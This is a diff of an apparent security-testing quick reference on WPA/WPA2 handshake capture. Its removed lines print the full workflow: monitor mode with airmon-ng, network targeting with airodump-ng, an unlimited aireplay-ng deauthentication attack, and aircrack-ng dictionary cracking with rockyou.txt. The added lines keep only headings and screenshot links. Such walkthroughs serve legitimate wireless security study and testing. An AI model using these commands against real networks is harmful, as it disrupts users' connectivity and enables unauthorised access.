@@ -57,50 +57,30 @@ Quick reference for capturing WPA/WPA2 handshakes and performing password securi
 ## 🟢 STEP 1 — Check Wireless Adapter
 ━━━━━━━━━━━━━━━━━━━━━━━
 
-
-iwconfig
-
-📌 Displays available wireless interfaces (e.g., wlan0)
-
-📸 Output
 <p align="center"> <img src="https://cdn.shopify.com/s/files/1/0667/8167/5618/files/1.png?v=1775249423" width="85%"> </p>
+
 🔵 STEP 2 — Enable Monitor Mode
 
 ━━━━━━━━━━━━━━━━━━━━━━━
 
-airmon-ng start wlan0
-
-📌 Enables monitor mode for packet capture
-
 📸 Output
 <p align="center"> <img src="https://cdn.shopify.com/s/files/1/0667/8167/5618/files/2.png?v=1775249423" width="85%"> </p>
+
 🔴 STEP 3 — Kill Conflicting Processes
 
 ━━━━━━━━━━━━━━━━━━━━━━━
 
-airmon-ng check kill
-
-📌 Stops background services interfering with monitoring
-
-📸 Output
 <p align="center"> <img src="https://cdn.shopify.com/s/files/1/0667/8167/5618/files/3.png?v=1775249422" width="85%"> </p>
+
 🟣 STEP 4 — Scan Wireless Networks
 
 ━━━━━━━━━━━━━━━━━━━━━━━
 
-airodump-ng wlan0
 
-📌 Lists nearby WiFi networks and connected devices
-
-📸 Output
 <p align="center"> <img src="https://cdn.shopify.com/s/files/1/0667/8167/5618/files/4.png?v=1775249423" width="85%"> </p>
 🟡 STEP 5 — Target Specific Network
 
 ━━━━━━━━━━━━━━━━━━━━━━━
-
-airodump-ng --bssid [BSSID] -c [CHANNEL] --write capture wlan0
-
-📌 Captures packets from selected network
 
 📸 Output
 <p align="center"> <img src="https://cdn.shopify.com/s/files/1/0667/8167/5618/files/5.png?v=1775249423" width="85%"> </p>
@@ -108,31 +88,16 @@ airodump-ng --bssid [BSSID] -c [CHANNEL] --write capture wlan0
 
 ━━━━━━━━━━━━━━━━━━━━━━━
 
-aireplay-ng --deauth 0 -a [BSSID] wlan0
-
-📌 Forces client reconnection to capture handshake (lab only)
-
-📸 Output
 <p align="center"> <img src="https://cdn.shopify.com/s/files/1/0667/8167/5618/files/6.png?v=1775249423" width="85%"> </p>
 ⚫ STEP 7 — Crack Captured Handshake
 
 ━━━━━━━━━━━━━━━━━━━━━━━
 
-aircrack-ng capture.cap -w /usr/share/wordlists/rockyou.txt
-
-📌 Attempts password cracking using dictionary attack
-
-📸 Output
 <p align="center"> <img src="https://cdn.shopify.com/s/files/1/0667/8167/5618/files/10.png?v=1775250340" width="85%"> </p>
 ⚪ STEP 8 — Wordlist Setup
 
 ━━━━━━━━━━━━━━━━━━━━━━━
 
-gzip -d /usr/share/wordlists/rockyou.txt.gz
-
-📌 Extracts wordlist for cracking
-
-📸 Output
 <p align="center"> <img src="https://cdn.shopify.com/s/files/1/0667/8167/5618/files/9.png?v=1775250399" width="85%"> </p>
 🔄 WORKFLOW SUMMARY
 
